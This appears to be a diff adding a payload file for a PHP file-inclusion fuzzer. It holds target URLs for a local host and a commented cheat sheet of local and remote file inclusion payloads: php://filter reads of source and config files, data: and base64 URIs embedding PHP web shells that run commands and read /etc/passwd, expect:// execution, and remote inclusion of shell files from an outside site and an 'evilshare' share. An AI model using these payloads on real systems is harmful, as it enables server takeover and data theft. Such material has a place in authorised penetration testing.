@@ -1,0 +1,27 @@
+http://192.168.1.103:80/index.php?system=TRAVERSAL
+http://192.168.1.103:80/index.php?system=php://filter/convert.base64-encode/resource=TRAVERSAL
+http://192.168.1.103:80/index.php?system=php://filter/read=convert.base64-encode/resource=TRAVERSAL
+#
+# URLS need to have at least one / after the port. eg http://127.0.0.1:1337/
+#
+#PHP filters
+#?file=php://filter/convert.base64-encode/resource=index
+#?file=php://filter/read=convert.base64-encode/resource=config	#same, but add a filter/read
+#?file=php://input		                                          #payload sent in POST request
+#?file=php://data                                               #does not work with dotdotpwn
+# data:text/plain,<?php phpinfo(); ?>
+# data:,<?system($_GET['x']);?>&x=ls
+# data:,<?php system($_GET['x']); ?>&x=ls
+# data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=cat /etc/passwd
+# data:;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=&c=dir
+# data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA2fPg%3d%3d
+# data://text/plain;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4%3D%26x%3Dcat%20%2fetc%2fpasswd
+# data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>
+#?file=expect://ls
+#
+#Remote FI
+#?file=https://websec.wordpress.com/shell
+#?file=https://websec.wordpress.com/shell.txt?
+#?file=https://websec.wordpress.com/shell.txt%23
+# (requires allow_url_fopen=On and allow_url_include=On)
+#?file=\\evilshare\shell.php
